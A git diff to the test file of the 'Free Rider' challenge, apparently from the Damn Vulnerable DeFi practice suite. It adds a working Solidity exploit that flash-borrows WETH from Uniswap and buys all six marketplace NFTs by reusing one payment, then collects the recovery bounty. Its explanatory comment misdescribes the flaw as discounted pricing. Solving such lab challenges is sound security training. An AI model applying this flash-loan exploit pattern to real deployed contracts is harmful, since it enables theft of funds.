@@ -11,6 +11,74 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+
+contract Attack {
+    IUniswapV2Pair immutable pair;
+    FreeRiderNFTMarketplace immutable marketplace;
+    FreeRiderRecoveryManager immutable recoveryManager;
+    WETH immutable weth;
+    DamnValuableNFT immutable nft;
+    address player;
+
+    constructor(
+        address _pair,
+        address payable _marketplace,
+        address _recoveryManager,
+        address _weth,
+        address _nft,
+        address _player
+    ) {
+        pair = IUniswapV2Pair(_pair);
+        marketplace = FreeRiderNFTMarketplace(_marketplace);
+        recoveryManager = FreeRiderRecoveryManager(payable(_recoveryManager));
+        weth = WETH(payable(_weth));
+        nft = DamnValuableNFT(_nft);
+        player = _player;
+    }
+
+    
+    function attack(uint256 amountToBorrow) external {
+
+        // Initiate the flash swap from Uniswap V2 pair
+        pair.swap(90 ether, 0, address(this), abi.encode("flash"));
+    }
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata) external {
+
+        uint amountBorrowed = amount0 ;
+        weth.withdraw(amountBorrowed);
+        uint256[] memory ids = new uint256[](6);
+
+        // Buy all NFTs from the marketplace
+        for (uint i = 0; i < 6; i++) ids[i] = i;
+        marketplace.buyMany{value: 15 ether}(ids);
+
+        //Transfer NFTs to recovery manager
+        for (uint i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), ids[i], abi.encode(player));
+        }
+        // Calculate the amount to repay to Uniswap V2 pair
+        uint amountToPay =( amountBorrowed*1000)/997+1;
+        weth.deposit{value: amountToPay}();
+
+        // Repay the flash swap
+        weth.transfer(address(pair), (amountToPay));
+
+    }
+
+    // Implement the IERC721Receiver interface to receive NFTs
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
+        external
+        returns (bytes4)
+    {
+       
+        return IERC721Receiver.onERC721Received.selector;
+    }
+    receive() external payable {}
+    
+}
+
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,11 +187,26 @@ contract FreeRiderChallenge is Test {
         assertEq(address(recoveryManager).balance, BOUNTY);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The exploit takes advantage of the fact that the Uniswap V2 pair allows for flash swaps, 
+        enabling the attacker to borrow WETH without upfront capital.
+        The attacker can then convert the borrowed WETH to ETH and use it to buy all NFTs from
+        the marketplace at once, taking advantage of the fact that the NFTs are being sold at a discount.
+    */
     function test_freeRider() public checkSolvedByPlayer {
-        
+
+        //New attack contract
+        Attack attacker = new Attack(
+            address(uniswapPair),
+            payable(address(marketplace)),
+            address(recoveryManager),
+            address(weth),
+            address(nft),
+            player
+        );  
+
+        //Start the attack 
+        attacker.attack(90 ether);
     }
 
     /**
